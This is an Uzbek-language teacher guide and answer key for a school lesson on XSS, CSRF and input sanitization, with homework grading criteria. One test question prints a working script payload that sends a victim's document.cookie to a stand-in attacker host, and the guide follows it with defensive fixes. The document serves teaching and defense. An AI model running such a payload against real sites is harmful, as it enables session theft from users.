# 27-Dars: O'qituvchi Uchun Metodik Qo'llanma va Imtihon Kaliti (Teacher Guide & Fixes)
**Target International School // 9-Sinf // 7-Hafta (40 daqiqa)**
**Mavzu:** Veb Xavfsizlik: XSS, CSRF va Kiruvchi Ma'lumotlarni Tozalash (Input Sanitization)
**Kohorta:** `9A 9B` (Web Security & Vulnerability Analysis)

---

## 1. Asosiy Pedagogik Maqsad
O'quvchilarga veb-ilovalardagi eng keng tarqalgan mijoz tomoni zaifliklari — Cross-Site Scripting (XSS) ning 3 turi (Stored, Reflected, DOM-based) va Cross-Site Request Forgery (CSRF) xurujlarini amalda ko'rsatish hamda ularni DOMPurify, Helmet sarlavhalari va HttpOnly cookie-lar orqali bartaraf etishni o'rgatish.

---

## 2. Test Savollari va O'qituvchi Yechimlar Kaliti (Test & Fixes Key)

### Test 1: XSS Ekspluatatsiyasi
* **Savol:** Quyidagi kiruvchi ma'lumot qanday qilib foydalanuvchi sessiyasini o'g'irlaydi?
  ```html
  <script>fetch('https://hacker.com/steal?cookie=' + document.cookie)</script>
  ```
* **Tashxis:** Agar veb-sahifa foydalanuvchi sharhlarini `innerHTML` orqali to'g'ridan-to'g'ri chiqarsa, ushbu skript barcha qurbonlar brauzerida ishga tushib, `document.cookie` dagi ma'lumotlarni xaker serveriga yuboradi.
* **Etalon Yechim (Teacher Fix):**
  1. `document.cookie` dagi sessiya tokenlarini `HttpOnly: true` bayrog'i bilan saqlash (JavaScript o'qiy olmaydi).
  2. Frontendda `userDiv.textContent = userInput` deb inert matn sifatida render qilish.
  3. Agar boy HTML format kerak bo'lsa: `userDiv.innerHTML = DOMPurify.sanitize(userInput)`.

---

## 3. Uy Vazifasi (`vazifa.html`) Baholash Mezoni (10 Ball)
* **XSS Turlari Tahlili (4 ball):** Stored, Reflected va DOM-based farqlari to'g'ri bayon etilgan.
* **DOMPurify Kodini Yozish (3 ball):** Zaif kod to'g'ri tozalangan.
* **CSRF Mudofaasi (2 ball):** SameSite=Strict va CSRF tokenlarining ishlashi asoslangan.
* **Xavfsiz Cookie Sozlamalari (1 ball):** HttpOnly va Secure bayroqlari to'g'ri ko'rsatilgan.
